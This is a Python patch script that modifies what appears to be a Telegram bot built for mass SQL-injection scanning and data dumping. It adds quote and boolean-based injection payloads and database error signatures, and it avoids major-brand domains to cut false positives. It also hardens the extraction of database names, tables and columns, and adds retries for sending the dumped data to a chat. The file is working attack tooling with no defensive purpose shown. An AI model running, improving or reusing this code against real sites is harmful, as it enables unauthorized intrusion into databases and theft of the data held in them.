import sys, os, json, re
from urllib.parse import urlparse
cands=[sys.argv[1]] if len(sys.argv)>1 else ["bot.py","new.py","test.py"]
fn=None
for c in cands:
    if os.path.exists(c): fn=c; break
if not fn:
    print("NO MAIN FILE"); sys.exit(1)
src=open(fn,"r",encoding="utf-8").read()
if "# FP-FIX-v1" in src:
    print("ALREADY PATCHED:",fn); sys.exit(0)
BIG=["amazon","flipkart","google","youtube","facebook","instagram","twitter","wikipedia","apple","microsoft","etsy","ebay","walmart","target","aliexpress","alibaba","shopify","paypal","stripe","github"]
if os.path.exists("vuln_cache.json"):
    try:
        vc=json.load(open("vuln_cache.json"))
        n=len(vc)
        vc={k:v for k,v in vc.items() if not any(b in urlparse(k).netloc.lower() for b in BIG)}
        json.dump(vc,open("vuln_cache.json","w"))
        print("CACHE PRUNED:",n-len(vc),"fake entries hataye")
    except: pass
INS_A='''# ============ 🎯 FP-FIX v1 (false-positive killer) ============
# FP-FIX-v1
BIGDOM=["amazon","flipkart","google","youtube","facebook","instagram","twitter","wikipedia","apple","microsoft","etsy","ebay","walmart","target","aliexpress","alibaba","shopify","paypal","stripe","github"]
STRICT_SIGS=["you have an error in your sql","right syntax to use","check the manual that corresponds","mysql_fetch_array","mysql_fetch_assoc","mysql_num_rows","mysqli_num_rows","warning: mysql_","warning: mysqli_","mariadb server","pg_query(","pg_exec(","postgresql query failed","sqlite3::query","sqlite_query(","ora-0","oracle error","pl/sql:","odbc sql server driver","microsoft jet database","jet database engine","unclosed quotation mark","unterminated string literal","quoted string not properly terminated","invalid input syntax for type","syntax error at or near","microsoft vb","vbscript runtime error","conversion failed when converting","supplied argument is not a valid","fatal error: uncaught pdoexception","db2 sql error","informix","division by zero"]
def sane_idlist(s,max_tok=400):
    toks=[t.strip() for t in s.split(",") if t.strip()]
    if not toks or len(toks)>max_tok: return False
    ok=sum(1 for t in toks if re.match(r"^[A-Za-z0-9_$]+$",t) and len(t)<=64)
    return ok>=max(1,int(len(toks)*0.8))
'''
a=src.index("async def a_scan(s,url,to):")
src=src[:a]+INS_A+src[a:]
a=src.index("async def a_scan(s,url,to):")
b=src.index("def turbo_inject(")
NEW_SCAN='''async def a_scan(s,url,to):
    # FP-FIX-v1
    try:
        net=urlparse(url).netloc.lower()
        if any(x in net for x in BIGDOM): return None
        parsed=urlparse(url); query=parse_qs(parsed.query,keep_blank_values=True)
        if not query: return None
        params=list(query.keys())[:2]; base_c=None
        for pi,param in enumerate(params):
            orig=(query[param] or [""])[0]
            for val in [orig+"'",orig+'\\"',orig+"'--",orig+"')--"]:
                nq=query.copy(); nq[param]=[val]
                t,_=await a_get_fb(s,build_url(parsed,nq),to=to)
                if not t: continue
                low=t.lower(); hit=None
                for sig in STRICT_SIGS:
                    if sig in low: hit=sig; break
                if not hit: continue
                if base_c is None:
                    bt,_=await a_get_fb(s,url,to=to); base_c=(bt or "").lower()
                if hit not in base_c: return {"url":url,"param":param,"payload":val,"sig":hit}
            if pi==0 and orig:
                bt,_=await a_get_fb(s,url,to=to)
                if bt:
                    l0=len(bt)
                    nq1=query.copy(); nq1[param]=[orig+"' AND '1'='1"]
                    nq2=query.copy(); nq2[param]=[orig+"' AND '1'='2"]
                    t1,_=await a_get_fb(s,build_url(parsed,nq1),to=to)
                    t2,_=await a_get_fb(s,build_url(parsed,nq2),to=to)
                    t3,_=await a_get_fb(s,build_url(parsed,nq2),to=to)
                    if t1 and t2 and t3:
                        l1,l2,l3=len(t1),len(t2),len(t3)
                        if abs(l2-l3)<=max(10,int(l2*0.02)) and abs(l1-l2)>=max(150,int(l1*0.2)) and abs(l1-l0)<=max(60,int(l0*0.05)):
                            return {"url":url,"param":param,"payload":"boolean-based","sig":"boolean-stable"}
        return None
    except: return None
'''
src=src[:a]+NEW_SCAN+"\n"+src[b:]
a=src.index("def extract_db(db,t):")
b=src.index("def sqli_fetch(")
NEW_EXT='''def extract_db(db,t):
    # FP-FIX-v1
    for rx in EXTRACT[db]:
        m=re.search(rx,t,re.I)
        if m:
            d=m.group(1).strip()
            if len(d)>300: continue
            if re.search(r"[<>={}();\\"']",d): continue
            if not (re.search(r"[A-Za-z]",d) or re.search(r"\\d+\\.\\d+",d)): continue
            return d
    return None
'''
src=src[:a]+NEW_EXT+"\n"+src[b:]
a=src.index("def sqli_fetch(")
b=src.index("def q_tables(")
NEW_SF='''def sqli_fetch(url,param,query,db,ph,to,strict=False):
    # FP-FIX-v1
    parsed=urlparse(url); bq=parse_qs(parsed.query,keep_blank_values=True)
    for f in WRAP[db]:
        nq=bq.copy(); nq[param]=[f(query)]
        t,s=_get(build_url(parsed,nq),ph,to)
        if t:
            d=extract_db(db,t)
            if d:
                if strict and not re.search(r"\\d",d): continue
                return d
    return None
'''
src=src[:a]+NEW_SF+"\n"+src[b:]
src=src.replace("v=sqli_fetch(url,p,VQ[d],d,ph,mode[\"timeout\"])", "v=sqli_fetch(url,p,VQ[d],d,ph,mode[\"timeout\"],True)",1)
src=src.replace("        tables=[t for t in tcsv.split(\",\") if t]", "        if not sane_idlist(tcsv): return res\n        tables=[t for t in tcsv.split(\",\") if t]",1)
src=src.replace("            cols=sort_cols([c for c in ccsv.split(\",\") if c])", "            if not sane_idlist(ccsv): continue\n            cols=sort_cols([c for c in ccsv.split(\",\") if c])",1)
src=src.replace("bio=io.BytesIO(data); bio.name=name; bot.send_document(cid,bio)", "bio=io.BytesIO(data); bio.name=name; bio.seek(0)\n    for _ in range(2):\n        try: bot.send_document(cid,bio); break\n        except Exception: bio.seek(0); time.sleep(2)",1)
open(fn,"w",encoding="utf-8").write(src)
print("PATCHED",fn,"- false-positive killer welded")
